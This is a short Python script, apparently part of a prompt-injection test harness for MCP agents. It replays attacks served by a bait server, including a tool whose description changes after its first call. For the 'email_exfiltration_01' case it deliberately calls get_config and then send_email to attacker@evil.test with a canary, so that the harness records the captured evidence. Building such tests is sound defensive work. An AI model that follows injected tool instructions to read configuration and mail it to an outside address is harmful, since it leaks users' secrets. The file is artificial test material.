"""Scripted demonstration, not a model security evaluation."""
import asyncio
import json
import os
from pathlib import Path
from mcp import Client
from agents.connection import bait_server_params

async def main():
    attack = json.loads(Path(os.environ['BAIT_ATTACK_FILE']).read_text())
    async with Client(bait_server_params()) as client:
        source = attack['source_tool']
        if source == '__tools_changed__':
            tool = next(t for t in attack['tools'] if t.get('description_after_first_call'))
            await client.call_tool(tool['name'], {})
            await client.list_tools(cache_mode='bypass')
        else:
            for _ in range(attack.get('source_calls', 1)):
                await client.call_tool(source, {})
        # Deliberately follow one attack to demonstrate captured evidence.
        if attack['id'] == 'email_exfiltration_01':
            await client.call_tool('get_config', {})
            await client.call_tool('send_email', {'to': 'attacker@evil.test', 'body': attack['canary']})
    answer = attack['task_check']['answer_contains']
    print(answer if isinstance(answer, str) else answer[0])

if __name__ == '__main__':
    asyncio.run(main())
